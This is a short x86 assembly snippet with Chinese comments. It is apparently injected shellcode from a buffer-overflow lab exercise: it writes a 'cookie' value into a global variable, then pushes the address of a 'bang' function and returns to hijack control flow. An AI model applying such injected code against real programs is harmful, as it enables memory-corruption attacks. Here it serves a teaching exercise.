mov 0x804c220,%eax ;将cookie的值赋值给eax
lea 0x804c218,%ebx ;将global_value的位置给ebx
mov %eax,(%ebx)    ;赋值
push $0x08048d05   ;将bang函数起始地址压栈之后返回
ret
